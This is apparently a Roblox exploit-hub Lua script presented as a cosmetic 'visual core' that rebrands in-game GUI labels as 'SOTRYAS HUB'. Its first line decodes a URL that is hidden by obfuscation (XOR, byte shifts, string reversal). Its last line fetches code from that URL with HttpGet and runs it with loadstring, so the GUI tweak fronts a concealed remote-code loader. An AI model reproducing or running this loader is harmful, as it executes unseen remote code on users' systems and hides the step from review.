
--[[ STAGE 2: VISUAL CORE ]]
local zqYTph_2wTJbDd5="\098\140\080\076\120\110\073\084\080\003\016\008\052\241\230\253\043\210\208\208\198\176\186\183\161\235\210\192\128\140\115\122\113"local bnvRPNC3EOSCLgNu_J=118 local bHuo711pKOqBn784iK=180 local S7zRsOLrbwcFhpEM=1 local xWmXmQ3BRs7miszAy=7 local u6HMcL99cvp6Wej3ojKK=4 local LNZeNaVXLuyHPzAFZ3Q3kf=true local EIlegi9q6muvmwQNGAOA=bit32 and bit32.bxor if not EIlegi9q6muvmwQNGAOA then EIlegi9q6muvmwQNGAOA=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Sixwj1_XUoYd7uZ={}for ZIuDuZwnRpZE=1,#zqYTph_2wTJbDd5 do local X4uMkgf_RX69vt=string.byte(zqYTph_2wTJbDd5,ZIuDuZwnRpZE)local hCQHKFzFAglg3eg7LxLFa3=(bHuo711pKOqBn784iK+(ZIuDuZwnRpZE*xWmXmQ3BRs7miszAy)+u6HMcL99cvp6Wej3ojKK)%256 if S7zRsOLrbwcFhpEM==0 then X4uMkgf_RX69vt=(X4uMkgf_RX69vt-hCQHKFzFAglg3eg7LxLFa3)%256 Sixwj1_XUoYd7uZ[ZIuDuZwnRpZE]=string.char(EIlegi9q6muvmwQNGAOA(X4uMkgf_RX69vt,bnvRPNC3EOSCLgNu_J))else X4uMkgf_RX69vt=EIlegi9q6muvmwQNGAOA(X4uMkgf_RX69vt,bnvRPNC3EOSCLgNu_J)Sixwj1_XUoYd7uZ[ZIuDuZwnRpZE]=string.char((X4uMkgf_RX69vt-hCQHKFzFAglg3eg7LxLFa3)%256)end end local e8YBFk1tSteEm951SUeA=table.concat(Sixwj1_XUoYd7uZ)if LNZeNaVXLuyHPzAFZ3Q3kf then e8YBFk1tSteEm951SUeA=string.reverse(e8YBFk1tSteEm951SUeA)end local NdJEfyoTvwINSHTp0Nl=e8YBFk1tSteEm951SUeA
local HubName = "SOTRYAS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(NdJEfyoTvwINSHTp0Nl))()
